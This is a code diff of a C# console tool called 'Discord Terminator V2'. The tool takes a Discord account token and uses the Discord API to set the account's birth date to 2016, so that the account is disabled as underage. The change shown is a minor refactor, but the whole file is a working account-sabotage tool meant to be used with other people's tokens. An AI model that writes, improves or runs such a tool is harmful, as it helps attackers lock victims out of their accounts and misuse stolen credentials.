@@ -11,19 +11,19 @@ namespace DiscordTerminatorV2
     {
         static bool DisableAccount(string token)
         {
-            HttpClient client = new HttpClient();
-            client.DefaultRequestHeaders.Add("Authorization", token);
+            using(HttpClient client = new HttpClient()) {
+                client.DefaultRequestHeaders.Add("Authorization", token);
 
-            var response = client.PatchAsync("https://discordapp.com/api/v6/users/@me", new StringContent("{\"date_of_birth\":\"2016-2-14\"}"));
+                var response = client.PatchAsync("https://discordapp.com/api/v6/users/@me", new StringContent("{\"date_of_birth\":\"2016-2-14\"}"));
 
-            return response.Result.StatusCode == System.Net.HttpStatusCode.OK;
+                return response.Result.StatusCode == System.Net.HttpStatusCode.OK;
+            }
         }
         static void Main(string[] args)
         {
             Console.Title = "Discord Terminator V2";
             Console.WriteLine("Enter Token: ");
-            string token = Console.ReadLine();
-            if (DisableAccount(token)) Console.WriteLine("Successfully disabled that account.");
+            if (DisableAccount(Console.ReadLine())) Console.WriteLine("Successfully disabled that account.");
             else Console.WriteLine("An error occurred while disabling that account, are you sure it's a valid token?");
             Console.ReadLine();
         }
